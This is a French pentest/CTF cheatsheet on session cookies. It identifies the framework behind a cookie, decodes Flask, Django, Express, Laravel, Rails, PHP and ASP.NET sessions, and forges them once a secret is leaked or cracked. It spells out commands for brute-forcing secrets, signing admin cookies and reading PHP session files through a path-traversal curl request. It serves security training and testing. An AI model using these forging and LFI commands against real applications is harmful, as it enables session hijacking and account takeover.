---
tags:
  - cheatsheet
---

# Cookies de session — Technique

> Identification du framework/langage derrière un cookie de session (Flask, Django, Express, Laravel, Rails, PHP, ASP.NET, JWT...), décodage et forgeage quand le secret est connu ou cassable.

---

## Présentation

Deux familles de cookies de session, à distinguer avant toute chose :

```
Opaque (référence)          Le cookie ne contient qu'un ID aléatoire.
                             La vraie donnée est côté serveur (DB/cache/fichier).
                             → Rien à décoder, mais un vol de fichier de session
                               (LFI, accès disque) donne un accès direct.

Auto-porteur (self-contained)  Le cookie contient la donnée elle-même,
                             signée (voire chiffrée) pour empêcher la falsification.
                             → Décodable sans le serveur. Forgeable SI le secret
                               de signature/chiffrement est connu ou cassé.
```

```
PHPSESSID=8f3a2c1e...              → opaque (PHP natif)
session=eyJ1c2VyIjoiYWRtaW4ifQ...  → auto-porteur (Flask)
```

## Détection / Identification

### Par le nom du cookie

| Nom de cookie | Framework / techno | Type |
|---|---|---|
| `session` | Flask (itsdangerous) | Auto-porteur, signé |
| `sessionid` | Django (session DB/cache) | Opaque |
| `sessionid` (avec points) | Django `signed_cookies` backend | Auto-porteur, signé |
| `csrftoken` | Django | Token CSRF, pas une session |
| `connect.sid` | Express.js (`express-session`) | Auto-porteur, signé |
| `laravel_session` | Laravel | Auto-porteur, chiffré (AES-256-CBC) |
| `XSRF-TOKEN` | Laravel | Chiffré, même clé `APP_KEY` |
| `PHPSESSID` | PHP natif | Opaque |
| `JSESSIONID` | Java (Tomcat, Spring, JSF) | Opaque |
| `remember-me` | Spring Security | Auto-porteur, `base64(user:expiry:hash)` |
| `ASP.NET_SessionId` | ASP.NET (InProc) | Opaque |
| `.ASPXAUTH` | ASP.NET Forms Auth | Auto-porteur, chiffré (machineKey) |
| `_<app>_session` | Ruby on Rails | Auto-porteur, chiffré+signé (`secret_key_base`) |
| `koa.sess` | Koa.js | Auto-porteur, signé |
| `<nom_custom>=eyJ...` | JWT stocké en cookie | Auto-porteur, signé/chiffré (voir `jwt_tool.md`) |

### Par la structure

```
eyJ...==.eyJ...==.HMAC_sig        → JWT (3 segments base64url séparés par .)
                                     header {"alg":...} visible en clair

<payload_b64>.<timestamp_b64>.<sig_b64>   → Flask / itsdangerous (3 segments, séparateur .)

value:timestamp:signature          → Django signed_cookies (séparateur :, base64 urlsafe)

s%3A<sid>.<hmac_b64>                → Express connect.sid
  (s%3A = "s:" urlencodé, le point sépare sid et signature)

eyJpdiI6...In0=                     → Laravel (base64 → JSON avec clés "iv","value","mac")

32 hex chars, pas de séparateur     → opaque (PHPSESSID, JSESSIONID, ASP.NET_SessionId...)
```

### Décodage rapide

```bash
# JWT / segments base64url génériques
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
# padding manquant -> ajouter des '=' si erreur

# Flask (itsdangerous) — décoder sans vérifier la signature
pip install flask-unsign
flask-unsign --decode --cookie "eyJ1c2VyIjoiYWRtaW4ifQ.ZZZZZZ.signature_ici"

# Django signed_cookies
python3 -c "
import base64
val = 'value:timestamp:signature'.split(':')
print(base64.urlsafe_b64decode(val[0] + '=='))
"

# Laravel — le cookie est du JSON base64
echo "eyJpdiI6...fQ==" | base64 -d | jq
# {"iv":"...","value":"...","mac":"...","tag":""}

# Générique : CyberChef (recipe "From Base64" + "JSON Beautify")
```

## Exploitation

### Flask — secret key cracking + forge (itsdangerous)

Le cookie `session` Flask est **signé** (HMAC-SHA1 par défaut via `itsdangerous`), pas chiffré : son contenu est toujours lisible, seule la falsification nécessite le `SECRET_KEY`.

```bash
# Installer
pip install flask-unsign

# 1. Décoder sans le secret (lecture seule)
flask-unsign --decode --cookie "<cookie_value>"

# 2. Brute-force du secret (wordlist ou wordlist par défaut de flask-unsign)
flask-unsign --unsign --cookie "<cookie_value>" --wordlist rockyou.txt

# 3. Forger un nouveau cookie une fois le secret connu
flask-unsign --sign --cookie "{'user': 'admin', 'is_admin': True}" --secret "clé_trouvée"
```

Secrets Flask fréquents en CTF : hardcodés dans le code source (`app.secret_key = "..."`), dans un `.env`/`config.py` accessible via LFI, ou une valeur par défaut copiée depuis un tutoriel.

### Django — signed_cookies / signing forgé

Si `SECRET_KEY` est connu (fuite, `DEBUG=True` avec traceback, dépôt git), le contenu peut être signé/forgé directement avec Django lui-même :

```python
import django
from django.conf import settings
settings.configure(SECRET_KEY="clé_trouvée")
django.setup()

from django.core.signing import Signer, TimestampSigner
signer = Signer()
print(signer.sign("admin"))            # valeur:signature
print(signer.unsign("valeur:signature"))
```

### Express.js — connect.sid

```bash
# Le cookie est "s:<sid>.<hmac-sha256 tronqué, base64>"
# Signature = HMAC-SHA256(sid, secret) — si secret connu, on peut forger n'importe quel sid

node -e "
const cookie = require('cookie-signature');
console.log(cookie.sign('nouveau_sid_arbitraire', 'secret_trouve'));
"
```
Le secret Express est passé à `session({ secret: '...' })` — souvent hardcodé ou dans une variable d'env exposée.

### Laravel — APP_KEY leaké

Le cookie est chiffré AES-256-CBC (ou GCM) avec `APP_KEY` (`base64:...` dans `.env`). Avec la clé, déchiffrement et forgeage complets :

```bash
git clone https://github.com/synacktiv/laravel_crypto_killer
python3 laravel_crypto_killer.py decrypt -k "APP_KEY_ici" -v "cookie_value"
python3 laravel_crypto_killer.py encrypt -k "APP_KEY_ici" -v '{"admin":true}'
```
`APP_KEY` en clair dans `.env` est un objectif classique de LFI/path traversal sur une appli Laravel.

### Ruby on Rails — secret_key_base leaké

```bash
git clone https://github.com/CoolerVoid/rails_cookie_decryptor
# ou gem rails-session_cookie
python3 rails_cookie_decryptor.py --cookie "<cookie>" --secret "secret_key_base_ici"
```
Rails ≤ 3.x signe seulement (Marshal + HMAC) → **désérialisation Marshal** possible si le secret est connu (RCE via gadget chain, cf. `deserialization.md`). Rails ≥ 4 chiffre en plus (AES-256-GCM), donc pas de simple falsification sans la clé.

### PHP natif — vol de fichier de session

`PHPSESSID` est opaque : rien à casser, mais si l'appli a une LFI/RFI, le fichier de session est directement lisible et écrasable côté serveur :

```bash
# Emplacement par défaut
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>

# Via LFI (voir lfi_rfi.md)
curl "http://target/index.php?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>"
```
Format brut : `nom_var|type:longueur:valeur;` (sérialisation PHP native, pas du JSON).

### ASP.NET — ViewState / .ASPXAUTH

Chiffré/signé avec la `machineKey` de l'application. Si elle est connue ou devinable (clé par défaut, fuite de `web.config`), falsification via `ysoserial.net` : détail complet dans `windows.md` et `deserialization.md` (section .NET).

### JWT en cookie

Un JWT stocké dans un cookie suit exactement les attaques JWT classiques (alg none, confusion RS256/HS256, `kid` injection, secret faible/brute-forçable) : voir `jwt_tool.md` pour le détail complet — la seule différence est le vecteur de transport (cookie au lieu de header `Authorization`).

## Comparaison rapide

| Framework | Cookie | Protection | Secret | Outil de forge |
|---|---|---|---|---|
| Flask | `session` | Signé (HMAC-SHA1) | `SECRET_KEY` | `flask-unsign` |
| Django | `sessionid` (signed) | Signé (HMAC) | `SECRET_KEY` | `django.core.signing` |
| Express | `connect.sid` | Signé (HMAC-SHA256) | `secret` (express-session) | `cookie-signature` (node) |
| Laravel | `laravel_session` | Chiffré (AES-256-CBC/GCM) | `APP_KEY` | `laravel_crypto_killer` |
| Rails | `_app_session` | Signé (≤3.x) / Chiffré+signé (≥4) | `secret_key_base` | `rails_cookie_decryptor` |
| PHP natif | `PHPSESSID` | Aucune (opaque) | — | Lecture fichier via LFI |
| ASP.NET | `.ASPXAUTH` | Chiffré/signé | `machineKey` | `ysoserial.net` |
| JWT | variable | Signé/chiffré (JWS/JWE) | selon `alg` | `jwt_tool` |

## Vulnérabilités / Misconfigurations classiques

| Faiblesse | Impact |
|---|---|
| `SECRET_KEY`/`APP_KEY`/`secret_key_base` hardcodé dans le code source ou un repo git | Forgeage complet de session (admin, autre utilisateur) |
| Valeur par défaut du framework jamais changée (ex : `SECRET_KEY` d'un tutoriel copié-collé) | Secret devinable/public, cassable instantanément |
| Secret faible → brute-forçable (`flask-unsign --unsign --wordlist`) | Compromission de toutes les sessions |
| `DEBUG=True` en prod (Django/Flask) avec traceback exposant la config | Fuite directe du secret |
| Cookie sans `HttpOnly` | Vol via XSS |
| Cookie sans `Secure` | Interception en clair sur réseau non chiffré |
| Cookie sans `SameSite` | CSRF facilité |
| Pas de rotation de session après authentification | Session fixation |
| Fichier de session PHP lisible via LFI | Vol/écrasement direct de session sans casser aucun secret |

## Outils de référence

| Outil | Usage |
|---|---|
| `flask-unsign` | Décoder / brute-forcer / forger des cookies Flask (itsdangerous) |
| `django.core.signing` (Python) | Signer/vérifier manuellement des cookies Django |
| `laravel_crypto_killer` | Déchiffrer/chiffrer des cookies Laravel avec `APP_KEY` |
| `rails_cookie_decryptor` | Déchiffrer/forger des cookies Rails avec `secret_key_base` |
| `jwt_tool` (voir `jwt_tool.md`) | Attaques complètes sur JWT, y compris en cookie |
| `ysoserial.net` (voir `deserialization.md`) | Forge de ViewState/.ASPXAUTH ASP.NET |
| CyberChef | Décodage générique base64/JSON/URL en un clic |

## Ressources

- [flask-unsign](https://github.com/Paradoxis/Flask-Unsign)
- [Django signing docs](https://docs.djangoproject.com/en/stable/topics/signing/)
- [laravel_crypto_killer](https://github.com/synacktiv/laravel_crypto_killer)
- [rails_cookie_decryptor](https://github.com/CoolerVoid/rails_cookie_decryptor)
- [HackTricks — Session Cookies](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies)
- [PayloadsAllTheThings — Insecure Cookie Handling](https://github.com/swisskyrepo/PayloadsAllTheThings)
